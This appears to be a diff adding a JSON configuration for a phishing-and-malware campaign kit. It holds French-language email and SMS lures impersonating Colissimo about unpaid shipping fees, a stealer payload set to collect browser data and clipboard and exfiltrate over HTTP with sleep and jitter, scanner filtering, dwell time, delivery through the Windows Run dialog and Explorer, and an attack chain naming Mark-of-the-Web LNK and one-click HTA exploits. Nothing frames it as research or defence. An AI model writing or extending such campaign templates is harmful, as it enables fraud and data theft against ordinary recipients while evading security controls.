@@ -1,0 +1,44 @@
+{
+  "id": "colis",
+  "label": "Colis non livré — frais de port",
+  "persona": {
+    "brand": "Colissimo",
+    "voice": "service client officiel, ton administratif",
+    "urgency": "high",
+    "lexicon": ["colis", "livraison", "expéditeur", "frais de port"]
+  },
+  "scenarios": ["delivery", "invoice"],
+  "channels": {
+    "email": {
+      "subject": "Colis {tracking} : paiement des frais en attente",
+      "body": "Bonjour {name},\n\nVotre colis {tracking} à destination de {city} n'a pas pu être livré : frais de port de {amount} non réglés.\n\nRéglez la situation avant {deadline}, sans quoi le colis repartira vers l'expéditeur.\n\n{lure}\n\nService client Colissimo — {agent}"
+    },
+    "sms": {
+      "body": "Colissimo : colis {tracking} non livré, frais {amount} à régler avant {deadline} → {lure}"
+    }
+  },
+  "context": {
+    "inject": ["tracking", "city", "amount", "deadline"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "explorer"],
+    "min_reliability": 4,
+    "prefer_tags": ["core", "default"],
+    "avoid": ["winr-certutil", "winr-bitsadmin"]
+  },
+  "payload": {
+    "kind": "stealer",
+    "collect": ["browser", "clipboard"],
+    "exfil": "http",
+    "sleep": 30,
+    "jitter": 0.4,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 6,
+    "variant_count": 3
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["motw-lnk", "hta-oneclick"]
+}
